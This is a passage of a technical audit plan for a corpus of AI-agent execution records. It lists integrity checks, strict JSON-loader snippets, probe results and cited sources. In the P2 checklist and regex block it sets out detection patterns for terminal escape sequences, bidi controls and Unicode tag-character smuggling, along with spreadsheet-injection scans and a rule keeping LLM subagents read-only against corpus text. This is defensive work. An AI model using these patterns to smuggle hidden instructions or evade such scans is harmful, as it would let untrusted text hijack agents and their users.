5. **Count reconciliation.** Per import: source files == raw-store objects == AER records == PROV bundles + explicitly listed rejects; every number in docs/manuscript regenerated by script and diffed. (B1, B2)
6. **Silent-failure audit of mapper code.** Grep/ruff for `except Exception`, bare `except`, `pass`/`continue` in except blocks, `errors="ignore"|"replace"`, `.get(..., default)` in `adapters/*`, `ingest/`, `raw/`, `aer/`; each needs a counter surfaced in the manifest. (C4)

**P1 - next**

7. Truncation and stop-reason census (A1, A4): by provider/model/benchmark; executions ending in `length`/`max_tokens`/`incomplete`/`refusal`/context-exceeded; unmatched tool calls/results.
8. Tool-argument parse-outcome census (A2, A3, A6): ok / double-encoded / invalid / repaired per tool and model; control-character and double-escape counts; key-set/type drift per tool.
9. Unicode census (A8, A9): Cc/Cf/Co/Cs/Cn, Tags block, bidi controls, zero-width, variation selectors, U+FFFD, NFC != original, mixed-script tokens, mojibake; raw vs AER counts equal.
10. Identifier census (A5): duplicates, orphans, charset/length by provider, ids reused across executions.
11. Encoding/locale grep (C2): `open(`/`read_text(`/`write_text(` without `encoding`; `.splitlines()` on JSONL; `decode(..., errors=...)`.
12. Time and ordering grep (C3): `utcnow`, naive `fromtimestamp`, `datetime.now()` without tz, `time.time()` into artefacts; unsorted `glob`/`listdir`/set iteration feeding output.
13. Test-oracle audit (C5): golden-regeneration commits; tests computing expected values with the unit under test; mutation score for `aer/canon.py`, `ingest/`, each mapper.
14. Dependency authenticity (C6): every import resolves to a locked, intended package; run with `-W error`.
15. Path/PII/secret leakage scan (C7): absolute paths, usernames, key patterns in all artefacts and docs.

**P2 - before any release or publication**

16. Escape-sequence scan (E2): ESC/C1/BEL in all text artefacts, reports, README, datasheet.
17. Rendering scan (E3): Markdown/HTML/DOT/SVG outputs for images, scripts, data-derived URLs; hostile-label render tests.
18. Record-boundary and spreadsheet-injection scan (E4).
19. YAML typing fixtures (E5).
20. Agent-containment review (E1): any LLM subagent reading corpus text is read-only and the text is delimited; third-party CLAUDE.md/AGENTS.md never loaded as instructions.
21. Negative integrity tests (D4) for `agentprov verify`.

---------------------------------------------------------------------------------------------------

## 4. Starting-point snippets (not run against the corpus)

```python
# strict-loader pieces (stdlib only)
def no_dups(pairs):
    d = {}
    for k, v in pairs:
        if k in d:
            raise ValueError(f"duplicate key {k!r}")
        d[k] = v
    return d
def no_const(x):            # NaN / Infinity / -Infinity
    raise ValueError(f"non-finite constant {x}")
# json.loads(text, object_pairs_hook=no_dups, parse_constant=no_const,
#            parse_int=<keep text, flag |n| > 2**53-1>,
#            parse_float=<flag non-finite / lexical-form mismatch>)
```

```text
Regexes for a string-content census (apply to decoded strings):
  controls (non-ws):   [\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]
  ESC / CSI / OSC:     \x1b|\x9b|\x9d
  bidi / invisible:    [\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\u00ad\u034f\u180e]
  tag characters:      [\U000e0000-\U000e007f]
  variation selectors: [\ufe00-\ufe0f\U000e0100-\U000e01ef]
  replacement char:    \ufffd
  mojibake:            Ã[\u0080-\u00bf]|â\u20ac|Â[\u00a0-\u00bf]
  lone surrogate:      [\ud800-\udfff]   (should never match in AER except via $utf16)
  double escaping:     \\[nrt"u]         (a literal backslash followed by n/r/t/quote/u in decoded text)
Bytes-level: BOM ^\xef\xbb\xbf ; NUL \x00 ; CR \r ; U+2028 \xe2\x80\xa8 ; U+2029 \xe2\x80\xa9 ; U+0085 \xc2\x85
```

Local probe results worth remembering (Python 3.14.8, rfc8785 0.1.4):
- `json.loads('{"a":1,"a":2}')` -> `{'a': 2}`; `json.loads('NaN')` -> `nan`; `json.loads('1e400')` -> `inf`; a 5000-digit int raises `ValueError` (int max str digits 4300); a leading BOM raises; a raw newline in a string raises; `"\x"` raises.
- `json.dumps({"a":"\ud800"}, ensure_ascii=False).encode("utf-8")` raises `UnicodeEncodeError`; default `ensure_ascii=True` emits `\ud800`.
- `json.dumps(1.0)` is `1.0`, `json.dumps(-0.0)` is `-0.0`; `rfc8785.dumps` yields `1` and `0`.
- `rfc8785.dumps(float('nan'))` -> `FloatDomainError`; `2**53` -> `IntegerDomainError`; lone surrogate in a value -> `CanonicalizationError`; in a key -> raw `UnicodeEncodeError`.
- JCS key order places U+1F600 before U+FFFF (UTF-16 code-unit order), unlike Python's code-point `sort_keys`.

---------------------------------------------------------------------------------------------------

## 5. Caveats on evidence quality

- Several quantitative claims come from vendor blogs or secondary summaries (CodeRabbit [S37], DataKitchen [S41], the third-party JSONSchemaBench summary [S12], the CSA note on Unicode injection [S26]); treat as indicative. Primary or peer-reviewed: Tambon et al. [S35], the review [S36], Pearce et al. [S38], Spracklen et al. [S39], Liu et al. [S21], RULER [S20], the RFCs, vendor documentation.
- Failure rates from older tools (Copilot 2021, Codex-era) do not transfer to current Claude models; they establish bug classes, not frequencies.
- Whether format restrictions degrade reasoning is contested [S34]; no claim is made.
- I found no controlled study of Claude-specific JSON escaping error rates in tool calls; the documented failure modes are the vendor's own warnings [S1][S2][S3] plus open-source issue trackers [S9][S10] (mostly via search-result summaries, not read in full).
- Some URLs (S9, S10, S20, S26, S32, S42) came from search-result listings and were not all fetched in full; confirm before quoting in the manuscript. The RULER arXiv id in S20 is from memory.

---------------------------------------------------------------------------------------------------

## Sources

- S1  Anthropic, Handling stop reasons: https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons
- S2  Anthropic, Structured outputs: https://platform.claude.com/docs/en/build-with-claude/structured-outputs
- S3  Anthropic, Fine-grained tool streaming (partial/invalid JSON, input_json_delta accumulation): https://platform.claude.com/docs/en/agents-and-tools/tool-use/fine-grained-tool-streaming
- S5  OpenAI, Structured outputs guide (refusals, incomplete status, JSON mode vs structured outputs): https://developers.openai.com/api/docs/guides/structured-outputs
- S7  Python docs, json module: https://docs.python.org/3/library/json.html
- S9  LangChain JSON parser commit on already-escaped quotes: https://git.kennethreitz.org/kennethreitz/langchain/src/commit/3f8f3de28e9e33cbf0889111a0362116de7a8928 ; Oracle langchain-oracle PRs on double-encoded tool args: https://github.com/oracle/langchain-oracle/pull/56 and https://github.com/oracle/langchain-oracle/pull/70
- S10 Agent-framework evidence on malformed tool args (valid-JSON-wrong-value Windows paths, repair chains, crashes on invalid history args): https://gitcode.com/atomgit_atomcode/atomcode/blob/main/crates/atomcode-core/src/turn/json_repair.rs ; https://github.com/charmbracelet/crush/issues/3153 ; https://evilpiepirate.org/forge/kent/consciousness/commit/3a8575b4295747de6f98c566f3658f296b547272 ; https://community.openai.com/t/functions-not-honoring-api-specification/427479
- S11 rfc8785 (Trail of Bits): https://pypi.org/project/rfc8785/ ; source https://github.com/trailofbits/rfc8785.py (read from the main branch; installed 0.1.4 probed locally)
- S12 JSONSchemaBench: https://arxiv.org/abs/2501.10868 ; unverified third-party summary: https://beancount.io/bean-labs/research-logs/2026/07/08/jsonschemabench-structured-outputs-language-models
- S13 Bishop Fox, JSON interoperability vulnerabilities: https://bishopfox.com/blog/json-interoperability-vulnerabilities ; PortSwigger: https://portswigger.net/daily-swig/research-how-json-parsers-can-create-security-risks-when-it-comes-to-interoperability ; Aalto thesis (DUPLIDOS): https://www.aalto.fi/en/events/department-of-computer-science-msc-thesis-presentations-94
- S14 RFC 8785 JCS: https://www.rfc-editor.org/rfc/rfc8785.html (errata: https://www.rfc-editor.org/rfc/inline-errata/rfc8785.html)
- S15 RFC 7493 I-JSON: https://www.rfc-editor.org/rfc/rfc7493.html
- S16 RFC 8259 JSON: https://www.rfc-editor.org/rfc/rfc8259.html
- S17 PEP 686, UTF-8 mode default in Python 3.15: https://peps.python.org/pep-0686/
- S18 Why do LLMs struggle to count letters: https://arxiv.org/abs/2412.18626 ; Counting ability and tokenization: https://arxiv.org/abs/2410.19730
- S19 Rethinking tabular data understanding with LLMs: https://arxiv.org/abs/2312.16702 ; RelationalFactQA: https://arxiv.org/abs/2505.21409
- S20 RULER: https://arxiv.org/abs/2404.06654
- S21 Liu et al., Lost in the Middle (TACL 2024): https://arxiv.org/abs/2307.03172
- S22 Do LLMs generate test oracles that capture the actual or the expected program behaviour: https://arxiv.org/abs/2410.21136
- S23 Design choices made by LLM-based test generators prevent them from finding bugs: https://arxiv.org/abs/2412.14137
- S24 OWASP LLM01 Prompt Injection: https://genai.owasp.org/llmrisk/llm01-prompt-injection/
- S25 Greshake et al., indirect prompt injection: https://arxiv.org/abs/2302.12173
- S26 ASCII smuggling / Unicode tag characters: https://languagelog.ldc.upenn.edu/nll/?p=66513 ; https://www.theregister.com/2024/08/28/microsoft_copilot_copirate ; low confidence, AI-assisted note: https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/03/CSA_research_note_unicode_instruction_injection_ai_skills_20260310-csa-styled-2.pdf
- S27 Terminal escape injection via LLM output: https://interhumanagreement.substack.com/p/llm-output-can-take-over-your-computer ; "Terminal DiLLMa" section in https://arxiv.org/abs/2412.06090 ; garak probes https://reference.garak.ai/en/latest/probes/ansiescape.html ; https://docs.brightsec.com/docs/ansi-escape-sequence-injection-aesi
- S28 Trojan Source (CVE-2021-42574, CVE-2021-42694): https://trojansource.codes/
- S29 Unicode UTS #39: https://unicode.org/reports/tr39/ ; UTR #36: https://www.unicode.org/reports/tr36/
- S30 Markdown image exfiltration: https://simonwillison.net/2023/Apr/14/new-prompt-injection-attack-on-chatgpt-web-version-markdown-imag/ ; https://simonwillison.net/2025/May/23/ ; https://www.promptarmor.com/resources/huggingface-chat-exfiltrates-data ; https://versprite.com/blog/data-exfiltration-via-image-rendering-fixed-in-continue/
- S31 CWE-117: https://cwe.mitre.org/data/definitions/117.html
- S32 Recall Them All (long list extraction): https://arxiv.org/abs/2405.02732 ; MemTrace: https://arxiv.org/pdf/2605.28732 ; lost-in-the-middle extraction study: https://arxiv.org/html/2511.13900v1
- S33 Anthropic, Increase output consistency: https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/increase-consistency
- S34 Tam et al., Let Me Speak Freely?: https://arxiv.org/abs/2408.02442 ; rebuttal https://blog.dottxt.ai/say-what-you-mean.html
- S35 Tambon et al., Bugs in LLM generated code: https://arxiv.org/abs/2403.08937
- S36 A Survey of Bugs in AI-Generated Code: https://arxiv.org/abs/2512.05239
- S37 CodeRabbit, State of AI vs Human Code Generation (vendor): https://www.coderabbit.ai/blog/state-of-ai-vs-human-code-generation-report
- S38 Pearce et al., Asleep at the Keyboard: https://arxiv.org/abs/2108.09293
- S39 Spracklen et al., We Have a Package for You (USENIX Security 2025): https://www.usenix.org/conference/usenixsecurity25/presentation/spracklen
- S40 datetime.utcnow deprecation: https://blog.miguelgrinberg.com/post/it-s-time-for-a-change-datetime-utcnow-is-now-deprecated ; https://discuss.python.org/t/why-is-datetime-utcnow-deprecated/86868
- S41 DataKitchen, Seven deadly sins of AI-generated data pipelines (vendor blog): https://datakitchen.io/blog/seven-deadly-sins-of-ai-generated-data-pipelines/
- S42 YAML Norway problem and sexagesimal pitfalls: https://hitchdev.com/strictyaml/why/implicit-typing-removed/ ; https://allan.reyes.sh/posts/yaml-norway-law/ ; https://github.com/yaml/pyyaml/issues/801

Source ids S4, S6, S8 are intentionally unused.
